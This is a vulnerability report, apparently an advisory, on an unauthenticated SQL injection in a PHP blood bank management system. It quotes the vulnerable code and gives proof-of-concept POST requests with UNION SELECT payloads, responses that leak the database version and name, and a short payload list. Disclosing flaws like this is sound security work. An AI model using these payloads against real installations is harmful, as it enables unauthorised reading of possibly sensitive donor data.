## BLOODBANK MANAGING SYSTEM IN PHP has an SQL injection vulnerability in get_state.php

## supplier 
https://code-projects.org/bloodbank-managing-system-in-php-with-source-code/
## Vulnerability file
`get_state.php:4-14`

`get_city.php:4-14`

`functions.php:5-18`

`functions.php:23-32`

## describe

The provincial/city linkage interface of this system does not perform any login verification, and directly concatenates the `$_POST` parameters into the SQL statement, forming a typical unauthorized SQL injection.

The key vulnerable code is as follows:

**Code analysis**    

```
// get_state.php
if(isset($_POST['G_STATE_ID']))
{
$sql="Select STATE_ID,STATE_NAME FROM state WHERE COUNTRY_ID=".$_POST['G_STATE_ID'];
```
```
// get_city.php
if(isset($_POST['G_STATE_ID']))
{
$sql="Select CITY_ID,CITY_NAME FROM city WHERE STATE_ID=".$_POST['G_STATE_ID'];
```

```
// functions.php
if(isset($_POST['G_CITY_ID']))
{
$sql="Select state.STATE_ID, state.STATE_NAME, city.CITY_NAME, city.CITY_ID
From state Inner Join
city On city.STATE_ID = state.STATE_ID
Where city.CITY_ID ={$_POST['G_CITY_ID']}";
```

```
// functions.php
if(isset($_POST['G_STATE_ID']))
{
$sql="Select STATE_ID,STATE_NAME FROM state WHERE COUNTRY_ID=".$_POST['G_STATE_ID'];
```

Vulnerable source statement:

```
Select STATE_ID,STATE_NAME FROM state WHERE COUNTRY_ID=".$_POST['G_STATE_ID']
Select CITY_ID,CITY_NAME FROM city WHERE STATE_ID=".$_POST['G_STATE_ID']
Where city.CITY_ID ={$_POST['G_CITY_ID']}
```

Because these interfaces return HTML `<option>` content, attackers can directly use `UNION SELECT` to echo sensitive database information to the frontend.

## POC

Get MySQL version

```
POST /blood/get_state.php HTTP/1.1
Host: 192.168.10.104
Content-Type: application/x-www-form-urlencoded

G_STATE_ID=0 UNION SELECT 1,@@version#
```

Actual response:

```
<option value="">Select State</option><option value='1'>5.7.26</option>
```

Get current database name

```
POST /blood/functions.php HTTP/1.1
Host: 192.168.10.104
Content-Type: application/x-www-form-urlencoded

G_STATE_ID=0 UNION SELECT 1,database()#
```

Actual response:

```
<option value='1'>blood_bank</option>
```

## Exploit

This vulnerability can be exploited directly without logging in, and a successful echo has already been achieved.

Example of using payload:

```
G_STATE_ID=0 UNION SELECT 1,@@version#
G_STATE_ID=0 UNION SELECT 1,user()#
G_STATE_ID=0 UNION SELECT 1,database()#
G_CITY_ID=0 UNION SELECT 1,2,3,4#
```

Based on the current echo features, the attacker can further enumerate `information_schema.tables` and `information_schema.columns`, and continue to read business table data.
